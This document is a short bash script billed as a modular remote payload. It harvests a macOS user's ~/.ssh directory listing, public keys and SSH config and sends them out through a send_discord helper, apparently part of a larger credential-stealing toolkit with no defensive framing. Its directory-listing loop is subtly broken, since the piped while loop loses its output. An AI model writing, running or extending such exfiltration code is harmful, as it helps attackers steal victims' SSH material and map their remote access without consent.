#!/bin/bash
# ============================================================
# SSH Keys Extractor for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔑 **SSH Keys from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

SSH_DIR="$HOME/.ssh"

if [[ -d "$SSH_DIR" ]]; then
    OUTPUT+="**📁 SSH Directory:**\n"
    ls -la "$SSH_DIR" 2>/dev/null | while read line; do
        OUTPUT+="\`$line\`\n"
    done
    OUTPUT+="\n"
    
    # Public keys
    for key in "$SSH_DIR"/*.pub; do
        if [[ -f "$key" ]]; then
            OUTPUT+="**🔓 $(basename "$key"):**\n"
            OUTPUT+="\`\`\`$(cat "$key")\`\`\`\n\n"
        fi
    done
    
    # SSH config
    if [[ -f "$SSH_DIR/config" ]]; then
        OUTPUT+="**⚙️ SSH Config:**\n"
        OUTPUT+="\`\`\`$(cat "$SSH_DIR/config")\`\`\`\n"
    fi
else
    OUTPUT+="⚠️ No .ssh directory found"
fi

send_discord "$OUTPUT"

